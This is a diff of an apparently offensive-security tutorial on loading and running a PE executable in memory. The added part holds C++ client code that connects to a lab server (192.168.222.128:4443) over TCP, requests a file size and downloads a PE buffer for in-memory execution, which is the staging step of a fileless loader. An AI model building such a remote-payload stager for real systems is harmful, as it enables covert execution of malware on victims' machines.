@@ -17,14 +17,89 @@ In brief, a PE file is an executable file format such as .exe (executable progra
 
 You can read more here https://0xrick.github.io/win-internals/pe2/
 
-## What do we need? 
+## How to run PE in memory ?
 
-To perform this technique we will need 
-1. Get the file
-2. Check the headers and get the right ones 
-3. Load sections 
-4. Start from the initial entry point
+In order to run a PE file, first of all it must be received, in our case we will receive the file using tcp and store this buffer in memory.
 
-### File retrieval 
+In my example, when connecting to the server, it asks to get the file size to increase the buffer, then the client sends a start command to get the file. After the server sends the file, we save it to the buffer as vector<char>. 
 
-Для получение файла мы будем использовать winsock2 из WinApi 
+```cpp
+printf("[+] Connecting!\n");
+
+//Initialize tcp client class 
+TCPClient tcpClient;
+
+//Receiving buffer
+std::vector<char> recvBuff;
+int iResult;
+
+//Value to check correct actions
+BOOL bConnResult;
+BOOL bSendResult;
+
+// Contecting to server
+bConnResult = tcpClient.connectToServer("192.168.222.128", 4443);;
+if (!bConnResult) {
+	return CONNECTION_ERROR;
+}
+
+printf("[+] Connected!\n");
+printf("[+] Send command to get file size!\n");
+
+// Send to the server to get file size
+bSendResult = tcpClient.sendToServer("GetFileSize");
+if (!bSendResult) {
+	return SENDING_ERROR;
+}
+
+// validation
+iResult = tcpClient.reciveData();
+if (iResult <= 0) {
+	return RECIVE_DATE_ERROR;
+}
+
+// Getting received buffer 
+recvBuff = tcpClient.getBuffer();
+
+// vector<char> to string 
+std::string sFileLength(recvBuff.begin(), recvBuff.end());
+printf("[+] Received data: %s\n", sFileLength.c_str());
+
+// str to int 
+int iFileLength = std::stoi(sFileLength);
+
+// Change the buffer length for the received data  
+tcpClient.setBufLen(iFileLength);
+
+printf("[+] Send command to load PE!\n");
+
+//Send to the server for load PE in memory
+bSendResult = tcpClient.sendToServer("start");
+if (!bSendResult) {
+	return SENDING_ERROR;
+}
+
+//We use delay to make sure the server sends the whole file.
+Sleep(1000 * 5);
+
+// Getting data
+iResult = tcpClient.reciveData();
+if (iResult <= 0 ) {
+	return RECIVE_DATE_ERROR;
+}
+
+// save to our buffer 
+recvBuff = tcpClient.getBuffer();
+printf("[+] Received data: %.*s\n", iResult, recvBuff.data());
+```
+
+
+
+
+
+
+
+
+
+
+
